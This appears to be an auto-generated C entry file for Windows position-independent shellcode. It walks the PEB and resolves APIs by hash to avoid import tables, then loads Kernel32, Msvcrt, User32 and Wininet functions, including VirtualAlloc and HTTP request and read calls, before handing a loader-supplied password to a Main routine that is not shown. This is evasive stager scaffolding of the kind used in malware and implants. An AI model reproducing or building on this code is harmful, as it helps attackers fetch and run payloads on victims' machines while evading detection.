/* This file creates automaticly, do not change it manualy */
#include <Core.h>
#include <Win32.h>
SEC( text, B ) VOID Entry( LPCWSTR PasswdFromLoader ) {
	INSTANCE Instance = { };
	Instance.Modules.Kernel32   	= LdrModulePeb( H_LIB_KERNEL32 );
	Instance.Win32.LoadLibraryA 	= LdrFunction( Instance.Modules.Kernel32,  H_FUNC_LOADLIBRARYA);
	if ( Instance.Modules.Kernel32 != NULL ) {
		Instance.Win32.LoadLibraryA = LdrFunction( Instance.Modules.Kernel32,  H_FUNC_LOADLIBRARYA);
		Instance.Win32.VirtualAlloc = LdrFunction( Instance.Modules.Kernel32,  H_FUNC_VIRTUALALLOC);
		Instance.Win32.ExitProcess = LdrFunction( Instance.Modules.Kernel32,  H_FUNC_EXITPROCESS);
	}
	Instance.Modules.Msvcrt = Instance.Win32.LoadLibraryA( GET_SYMBOL( "Msvcrt" ) );
	if ( Instance.Modules.Msvcrt != NULL ) {
		Instance.Win32.printf = LdrFunction( Instance.Modules.Msvcrt,  H_FUNC_PRINTF);
	}
	Instance.Modules.User32 = Instance.Win32.LoadLibraryA( GET_SYMBOL( "User32" ) );
	if ( Instance.Modules.User32 != NULL ) {
		Instance.Win32.MessageBoxA = LdrFunction( Instance.Modules.User32,  H_FUNC_MESSAGEBOXA);
	}
	Instance.Modules.Wininet = Instance.Win32.LoadLibraryA( GET_SYMBOL( "Wininet" ) );
	if ( Instance.Modules.Wininet != NULL ) {
		Instance.Win32.InternetOpenA = LdrFunction( Instance.Modules.Wininet,  H_FUNC_INTERNETOPENA);
		Instance.Win32.InternetConnectA = LdrFunction( Instance.Modules.Wininet,  H_FUNC_INTERNETCONNECTA);
		Instance.Win32.HttpOpenRequestA = LdrFunction( Instance.Modules.Wininet,  H_FUNC_HTTPOPENREQUESTA);
		Instance.Win32.HttpSendRequestA = LdrFunction( Instance.Modules.Wininet,  H_FUNC_HTTPSENDREQUESTA);
		Instance.Win32.InternetReadFile = LdrFunction( Instance.Modules.Wininet,  H_FUNC_INTERNETREADFILE);
		Instance.Win32.InternetCloseHandle = LdrFunction( Instance.Modules.Wininet,  H_FUNC_INTERNETCLOSEHANDLE);
	}
	Main(Instance, PasswdFromLoader);
	Instance.Win32.ExitProcess(0);
}
